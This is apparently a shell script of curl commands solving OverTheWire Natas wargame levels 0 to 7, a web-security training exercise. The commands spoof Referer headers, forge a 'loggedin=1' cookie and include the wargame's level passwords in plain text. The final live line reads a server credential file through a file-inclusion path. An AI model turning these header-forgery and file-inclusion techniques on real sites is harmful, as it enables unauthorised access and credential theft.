#!/bin/sh

# Alternatives:
# Using Header with auth: basic
#curl -s http://natas0.natas.labs.overthewire.org -H "Authorization: Basic bmF0YXMwOm5hdGFzMA==" | grep natas1 | cut -d " " -f 6

# Using Header direct login credentials
#curl -s http://natas1.natas.labs.overthewire.org --user natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto | grep natas2 | cut -d " " -f 6

# Referer
#curl -s http://natas4.natas.labs.overthewire.org --user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ -H "Referer: http://natas5.natas.labs.overthewire.org/" | grep natas5 | cut -d " " -f 8

# Cookie
#curl -s http://natas5.natas.labs.overthewire.org --user natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq -H "Cookie: loggedin=1" | grep natas6 | cut -d " " -f 8 | cut -d "<" -f 1

# Fetching the secret 
# curl -s -X POST http://natas6.natas.labs.overthewire.org --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 -d "secret=FOEIUWGHFEEUHOFUOIU&submit=Submit+Query" | grep natas7 | cut -d " " -f 8

curl -s http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8 --user natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 | cut -d ">" -f 9 | uniq


